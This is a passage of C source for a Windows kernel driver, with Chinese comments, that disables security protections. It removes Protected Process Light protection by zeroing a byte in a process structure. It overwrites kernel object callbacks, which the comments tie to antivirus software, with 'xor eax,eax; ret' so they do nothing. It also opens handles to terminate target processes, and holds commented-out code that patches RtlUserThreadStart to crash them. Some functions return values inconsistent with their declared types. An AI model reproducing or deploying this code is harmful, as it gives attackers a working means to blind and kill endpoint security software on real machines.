		memcpy(temp, *(DWORD64*)(outBuf + 8), *outBuf);
		memcpy(temp + *outBuf, tempOut, 3);
		memcpy(outBuf, temp, *outBuf+3);
		ExFreePool(temp);
		break;
	}
	case enum_SetEntryRoutineHeadBytes: {
		UCHAR* temp = (UCHAR*)ExAllocatePoolWithTag(NonPagedPool, preSetEntryRoutineHeadBytesCount, 'tgnU');
		memcpy(temp, &msg->a1, preSetEntryRoutineHeadBytesCount);
		gEntryRoutineHeadBytes = temp;
		break;
	}
	case enum_CheckPPL: {
		int a = CheckProcessPPL(msg->a1);
		if (a) { *(DWORD*)outBuf = 12138; *bytesOut = 4; }
		else
			*bytesOut = 0;
		break;
	}
	case enum_RestoreObjectCallback: {
		RestoreObjectCallback(msg->a1, &msg->a2);
		break;
	}
	case enum_DisablePPL:
	{
		DisableTargetProcessPPL(msg->a1);
		break;
	}
	case enum_ChangeCallbackFunctionToXoreax_eax_ret:
		ChangeCallbackFunctionToXoreax_eax_ret(msg->a1);
		break;
	case enum_SetTargetProcessName: {
		// 这个被调用，我们就要重设g.pid
		AvAcquireResourceExclusive(&g.fs_ep_lock);
		g.pid = 0;
		gNowYouCanStartCapture = 0;
		AvReleaseResource(&g.fs_ep_lock);

		ANSI_STRING ansi;

		ConvertCharToAnsiString((char*)&msg->a1, &ansi);

		UNICODE_STRING unicodePath;
		NTSTATUS status = RtlAnsiStringToUnicodeString(&unicodePath, &ansi, TRUE);
		if (0 != status) {
			DbgPrint("failed to convert char* to unicode string\n");
			return;
		}
		AvAcquireResourceExclusive(&g.fs_ep_lock); 
		Reset = 0;
		RtlCopyUnicodeString(gTargetProcessName, (PUNICODE_STRING)&unicodePath);
		EndLoop = 0;
		AvReleaseResource(&g.fs_ep_lock);
		FreeAnsiString(&ansi);

		break;
	}
	case enum_StopThreadCreateSleep: {
		AvAcquireResourceExclusive(&g.fs_ep_lock);
		EndLoop = 1;
		AvReleaseResource(&g.fs_ep_lock);
		break;
	}
	case enum_DebugFromBeginning: {
		// 90 eb fd     循环卡死指令
	}
	case enum_SetPPLOff: {

		AvAcquireResourceExclusive(&g.fs_ep_lock);
		gPPLOff = msg->a1;
		gETHREAD_StartAddrOff = msg->a2;
		AvReleaseResource(&g.fs_ep_lock);
		break;
	}
	default:
		break;
	}


}

VOID ConvertAnsiToUnicode( char* ansi, PUNICODE_STRING unicode) {
	ANSI_STRING ansiString;
	RtlInitAnsiString(&ansiString, ansi);

	// Allocate buffer for the UNICODE_STRING
	NTSTATUS status = RtlAnsiStringToUnicodeString(unicode, &ansiString, TRUE);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Conversion failed: 0x%X\n", status);
	}
}
const UNICODE_STRING* GetModulePathFromAddress(PVOID address) {
	PLIST_ENTRY list = (PLIST_ENTRY)PsLoadedModuleList;
	if (!list) return NULL;

	PLIST_ENTRY current = list->Flink;

	while (current != list) {
		PKLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		PVOID base = entry->DllBase;
		ULONG size = entry->SizeOfImage;
		ULONG_PTR start = base;
		ULONG_PTR addr = address;
		ULONG_PTR end = start + (ULONG_PTR)size;
		// DbgPrint("addr: 0x%p\tstart: 0x%p\tend: 0x%p\t%wZ\n", addr,start,end,&entry->FullDllName);
	//if (0xFFFFF80227FB0000 == start)
	//	DbgBreakPoint();
		if (0 == ((addr - start) & 0x8000000000000000)) {
			if (0 == ((end-addr) & 0x8000000000000000)) {
			//	DbgPrint("function located at module: %wZ\n", &entry->FullDllName);
				return &entry->FullDllName;
			}
		}
		current = current->Flink;
	}

	return NULL;  // Only return something if a match was found
}
VOID RestoreObjectCallback(DWORD64 funcAddr, UCHAR* _3bytes) {
	PMDL mdl = IoAllocateMdl(funcAddr, 3, FALSE, FALSE, NULL);
	if (mdl == NULL) {
		// Handle error if memory allocation failed
		return;
	}

	__try {
		MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);
		PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

		// Fill the function with 0x90 (NOP instructions)
		if (mappedAddress != NULL) {

			*(PUCHAR)((UCHAR*)mappedAddress )= _3bytes[0];
			*(PUCHAR)((UCHAR*)mappedAddress+1) = _3bytes[1];
			*(PUCHAR)((UCHAR*)mappedAddress+2) = _3bytes[2];
			MmUnmapLockedPages(mappedAddress, mdl);
		}

		MmUnlockPages(mdl);
	}
	__finally {
		IoFreeMdl(mdl);
	}

	return ;

}
VOID ReadOut3ByteAsmCode(DWORD64 funcAddr, char* tempOut) {


	PUCHAR functionAddress = (PUCHAR)funcAddr;

	// Make the memory page containing myprintf writeable
	// xor eax,eax  ret 就是  31 c0 c3  只占3字节
	PMDL mdl = IoAllocateMdl(functionAddress, 3, FALSE, FALSE, NULL);
	if (mdl == NULL) {
		// Handle error if memory allocation failed
		return;
	}

	__try {
		MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);
		PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

		// Fill the function with 0x90 (NOP instructions)
		if (mappedAddress != NULL) {

			tempOut[0] = *(PUCHAR)((PUCHAR)mappedAddress);
			tempOut[1] = *(PUCHAR)((PUCHAR)mappedAddress + 1);
			tempOut[2] = *(PUCHAR)((PUCHAR)mappedAddress + 2);
			MmUnmapLockedPages(mappedAddress, mdl);
		}

		MmUnlockPages(mdl);
	}
	__finally {
		IoFreeMdl(mdl);
	}


}int  CheckProcessPPL(DWORD pid){
	PEPROCESS targetEP = 0;
	PsLookupProcessByProcessId(pid, &targetEP);
	int ret = 0;

	PUCHAR functionAddress = (PUCHAR)targetEP + gPPLOff;

	// Make the memory page containing myprintf writeable
	// xor eax,eax  ret 就是  31 c0 c3  只占3字节
	PMDL mdl = IoAllocateMdl(functionAddress, 1, FALSE, FALSE, NULL);
	if (mdl == NULL) {
		// Handle error if memory allocation failed
		return;
	}

	__try {
		MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);
		PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

		// Fill the function with 0x90 (NOP instructions)
		if (mappedAddress != NULL) {

			ret = *(PUCHAR)mappedAddress;
			MmUnmapLockedPages(mappedAddress, mdl);
		}

		MmUnlockPages(mdl);
	}
	__finally {
		IoFreeMdl(mdl);
	}

	return ret;

}
typedef struct _PROCESS_OPEN_INFO {
	DWORD access;
	UCHAR inherit;
	DWORD pid;
} PROCESS_OPEN_INFO, *PPROCESS_OPEN_INFO;
VOID TerminateTargetProcess(int pid,UCHAR* outBuf, DWORD* bytesOut) {
	// 我看了一一下GitHub上openark项目的代码，它是通过用户模式像内核模式请求打开指定进程的句柄，然后在用户层termiante掉的
	/*if (outlen < 4) {
		irp->IoStatus.Information = 4;
		return STATUS_BUFFER_OVERFLOW;
	}*/
	//if (inlen < sizeof(PROCESS_OPEN_INFO)) return STATUS_UNSUCCESSFUL;

	// PPROCESS_OPEN_INFO info = (PPROCESS_OPEN_INFO)inbuf;

	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)pid;
	cid.UniqueThread = (HANDLE)0;

	DWORD attr = 0;
	HANDLE handle;
	OBJECT_ATTRIBUTES oa;
	// if (info->inherit) attr |= OBJ_INHERIT;
	InitializeObjectAttributes(&oa, NULL, attr, NULL, NULL);
	NTSTATUS status = ZwOpenProcess(&handle, 1, &oa, &cid);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	memcpy(outBuf, &handle, 4);
	*bytesOut = 4;
	AvAcquireResourceExclusive(&g.fs_ep_lock);
	gTargetEPTobeCrashed = pid;
	AvReleaseResource(&g.fs_ep_lock);

	return ;



	PEPROCESS targetProcess = NULL;
	  status = PsLookupProcessByProcessId(pid, &targetProcess);
	if (!NT_SUCCESS(status)) {
		DbgPrint("Failed to lookup process: 0x%X\n", status);
		return status;
	}	HANDLE ProcessHandle;
	status = ObOpenObjectByPointer(targetProcess, OBJ_KERNEL_HANDLE, NULL, 1, *PsProcessType, KernelMode, &ProcessHandle);


	if (NT_SUCCESS(status)) {
		DbgBreakPoint();
		// 用户模式需要将RtlUserThreadStart 函数相对于ntdll的偏移量传过来
		UCHAR* ntdllBase = GetNtdllBaseAddress(targetProcess);
		UCHAR* userRtluserthreadstartFunctionAddr = gRtlUserThreadStartOff + ntdllBase;
		//		KAPC_STATE state;
		//		KeStackAttachProcess(targetProcess, &state);
		//		/*
		//xor eax,eax
		//mov rax,qword ptr [rax]
		//		*/
		//		// 这条指令应该能够在目标进程下一次启动新的进程时立刻崩溃掉目标进程
		//		*(userRtluserthreadstartFunctionAddr+0)=0x31;
		//		*(userRtluserthreadstartFunctionAddr+1)=0xc0;
		//		*(userRtluserthreadstartFunctionAddr+2)=0x48;
		//		*(userRtluserthreadstartFunctionAddr+3)=0x8b;
		//		*(userRtluserthreadstartFunctionAddr+4)=0x00;
		//		KeUnstackDetachProcess(&state);
	//UCHAR patch[5] = {
	//0x31 ,
	//0xc0 ,
	//0x48 ,
	//0x8b ,
	//0x00 };
	//int bytesWritten = 0;
	//NTSTATUS status2=MmCopyVirtualMemory(
	//	PsGetCurrentProcess(),     // From (kernel)
	//	patch,                      // Source buffer
	//	targetProcess,                   // To
	//	userRtluserthreadstartFunctionAddr,               // Destination in target process
	//	5,
	//	KernelMode,                // You’re kernel-mode
	//	&bytesWritten
	//);
	//DbgPrint("status 2: 0x%x\n", status2);
		ZwClose(ProcessHandle);
		ObDereferenceObject(targetProcess);
	}
	else {
		DbgPrint("failed call ObOpenObjectByPointer: 0x%x\n", status);
	}
}
PUNICODE_STRING GetFuncModule(DWORD64 funcAddr) {

	DbgPrint("target obcallback function addr: 0x%p\n", funcAddr);
	// 首先我们要判断这个回调到底是不是杀软的 
	PVOID targetFn = (PVOID)&ZwQueryInformationProcess;
 UNICODE_STRING* path = GetModulePathFromAddress(funcAddr);
	if (path) {
		// 把函数对应的路径返回给客户端口，让客户端决定是否清除这个回调
		DbgPrint("Function is in module: %wZ\n", path);
	}
	return path;
}
VOID DisableTargetProcessPPL(DWORD pid) {
	PEPROCESS targetEP = 0;
	PsLookupProcessByProcessId(pid, &targetEP);


	PUCHAR functionAddress = (PUCHAR)targetEP+gPPLOff;

	// Make the memory page containing myprintf writeable
	// xor eax,eax  ret 就是  31 c0 c3  只占3字节
	PMDL mdl = IoAllocateMdl(functionAddress, 1, FALSE, FALSE, NULL);
	if (mdl == NULL) {
		// Handle error if memory allocation failed
		return;
	}

	__try {
		MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);
		PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

		// Fill the function with 0x90 (NOP instructions)
		if (mappedAddress != NULL) {

			*(PUCHAR)((PUCHAR)mappedAddress) = 0;
			MmUnmapLockedPages(mappedAddress, mdl);
		}

		MmUnlockPages(mdl);
	}
	__finally {
		IoFreeMdl(mdl);
	}

}
DWORD ChangeCallbackFunctionToXoreax_eax_ret(DWORD64 funcAddr) {
	// DbgPrint("target obcallback function addr: 0x%p\n", funcAddr);
	// // 首先我们要判断这个回调到底是不是杀软的 
	// PVOID targetFn = (PVOID)&ZwQueryInformationProcess;
	// const UNICODE_STRING* path = GetModulePathFromAddress(targetFn);
	// if (path) {
	// 	// 把函数对应的路径返回给客户端口，让客户端决定是否清除这个回调
	// 	DbgPrint("Function is in module: %wZ\n", path);
	// }
//	DbgBreakPoint();


	PUCHAR functionAddress = (PUCHAR)funcAddr;

	// Make the memory page containing myprintf writeable
	// xor eax,eax  ret 就是  31 c0 c3  只占3字节
	PMDL mdl = IoAllocateMdl(functionAddress, 3, FALSE, FALSE, NULL);
	if (mdl == NULL) {
		// Handle error if memory allocation failed
		return;
	}

	__try {
		MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);
		PVOID mappedAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, FALSE, NormalPagePriority);

		// Fill the function with 0x90 (NOP instructions)
		if (mappedAddress != NULL) {

			*(PUCHAR)((PUCHAR)mappedAddress) = 0x31;
			*(PUCHAR)((PUCHAR)mappedAddress + 1) = 0xc0;
			*(PUCHAR)((PUCHAR)mappedAddress + 2) = 0xc3;
			MmUnmapLockedPages(mappedAddress, mdl);
		}

		MmUnlockPages(mdl);
	}
	__finally {
		IoFreeMdl(mdl);
	}

}

